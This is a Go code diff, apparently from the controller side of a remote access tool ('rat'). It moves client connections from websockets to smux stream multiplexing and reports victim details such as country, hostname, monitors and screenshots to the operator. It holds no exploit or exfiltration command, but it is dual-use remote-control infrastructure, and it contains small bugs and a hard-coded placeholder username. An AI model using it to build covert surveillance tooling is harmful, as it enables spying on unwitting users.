@@ -3,26 +3,25 @@ package main
 import (
 	"encoding/base64"
 	"encoding/binary"
+	"fmt"
 	"math/rand"
 	"net"
+	"rat/command/log"
 	"rat/shared"
-	"rat/shared/network"
 	"rat/shared/network/header"
+	"sync"
 
 	"strconv"
 	"strings"
 	"time"
 
-	"golang.org/x/net/websocket"
+	"github.com/xtaci/smux"
 )
 
-type listenerMap map[header.PacketHeader]*websocket.Conn
-
 type Client struct {
-	network.Writer
-	network.Reader
-
-	Conn net.Conn
+	session *smux.Session
+	Conn    net.Conn
+	stream  *smux.Stream
 
 	Id int
 
@@ -42,9 +41,10 @@ type Client struct {
 		Buffer    []byte
 	}
 
-	Queue chan OutgoingPacket
-
-	Listeners listenerMap
+	Queue      chan Outgoing
+	streamChan chan Channel
+	die        chan struct{}
+	dieLock    sync.Mutex
 
 	Monitors []shared.Monitor
 
@@ -54,16 +54,91 @@ type Client struct {
 func NewClient(conn net.Conn) *Client {
 	client := new(Client)
 
-	client.Queue = make(chan OutgoingPacket)
+	client.Queue = make(chan Outgoing)
+	client.streamChan = make(chan Channel)
+	client.die = make(chan struct{})
 
 	client.Conn = conn
 	client.Id = int(rand.Int31())
 	client.Computer = shared.Computer{}
 	client.Country, client.CountryCode = GetCountry(client.GetIP())
-	client.Listeners = make(map[header.PacketHeader]*websocket.Conn)
 	client.Monitors = make([]shared.Monitor, 0)
 
 	return client
+}
+
+func (c *Client) Close(err error) {
+	c.dieLock.Lock()
+	defer c.dieLock.Unlock()
+
+	select {
+	case <-c.die:
+	default:
+		close(c.die)
+		c.Conn.Close()
+		log.Println("disconnect", err)
+		removeClient(c)
+	}
+}
+
+func (c *Client) recvLoop() {
+	var err error
+	for {
+		var h header.PacketHeader
+		err = binary.Read(c.stream, shared.ByteOrder, &h)
+
+		if err != nil {
+			break
+		}
+
+		packet, is := incomingPackets[h]
+		if !is {
+			err = fmt.Errorf("invalid packet header", h)
+			break
+		}
+
+		err = packet.Read(c.stream, c)
+		if err != nil {
+			break
+		}
+	}
+
+	select {
+	case <-c.die:
+	default:
+		c.Close(err)
+	}
+}
+
+func (c *Client) writeLoop() {
+	var err error
+	for err == nil {
+		select {
+		case <-c.die:
+			return
+		case ch := <-c.streamChan:
+			stream, err := c.session.OpenStream()
+			if err != nil {
+				break
+			}
+			err = c.WriteHeader(ch.Header(), true)
+			if err != nil {
+				break
+			}
+			go ch.Open(stream, c)
+		case p := <-c.Queue:
+			err = c.WriteHeader(p.Header(), false)
+			if err != nil {
+				break
+			}
+			err = p.Write(c.stream, c)
+			if err != nil {
+				break
+			}
+		}
+	}
+
+	c.Close(err)
 }
 
 func (c *Client) GetDisplayHost() string {
@@ -124,35 +199,36 @@ func (c *Client) GetPathSep() string {
 // Heartbeat pings the client and waits
 func (c *Client) Heartbeat() {
 	for {
-		c.Queue <- &Ping{}
+		select {
+		case <-c.die:
+			return
+		default:
+			c.Queue <- &Ping{}
 
-		for !c.Ping.Received {
-			time.Sleep(time.Millisecond)
+			for !c.Ping.Received {
+				time.Sleep(time.Millisecond)
+			}
+
+			time.Sleep(time.Second * 2)
 		}
-
-		time.Sleep(time.Second * 2)
 	}
 }
 
 func (c *Client) ReadHeader() (header.PacketHeader, error) {
 	var h header.PacketHeader
-	err := binary.Read(c.Conn, shared.ByteOrder, &h)
+	err := binary.Read(c.stream, shared.ByteOrder, &h)
 
 	return h, err
 }
 
-func (c *Client) WriteHeader(header header.PacketHeader) error {
-	return binary.Write(c.Conn, shared.ByteOrder, header)
-}
-
-func (c *Client) WritePacket(packet OutgoingPacket) error {
-	err := c.WriteHeader(packet.Header())
+func (c *Client) WriteHeader(header header.PacketHeader, channel bool) error {
+	err := binary.Write(c.stream, shared.ByteOrder, header)
 
 	if err != nil {
 		return err
 	}
 
-	return c.Writer.WritePacket(packet)
+	return binary.Write(c.stream, shared.ByteOrder, channel)
 }
 
 // GetEncodedScreen returns a base64 encoded version of the most recent screenshot
@@ -162,12 +238,16 @@ func (c *Client) GetEncodedScreen() string {
 
 func (c *Client) GetClientData() ClientData {
 	return ClientData{
-		Ping:                c.Ping.Current,
-		Country:             c.GetCountry(),
-		Flag:                c.GetFlagName(),
-		Host:                c.GetDisplayHost(),
-		ComputerName:        c.Computer.GetDisplayName(),
-		OperatingSystemType: c.OperatingSystemType,
-		OperatingSystem:     c.Computer.OperatingSystem,
+		Ping:     c.Ping.Current,
+		Country:  c.GetCountry(),
+		Flag:     c.GetFlagName(),
+		Host:     c.GetDisplayHost(),
+		Hostname: c.Computer.GetDisplayName(),
+		Username: "ss",
+		Monitors: c.Monitors,
+		OperatingSystem: OperatingSystem{
+			Type:    c.OperatingSystemType,
+			Display: c.Computer.OperatingSystem,
+		},
 	}
 }
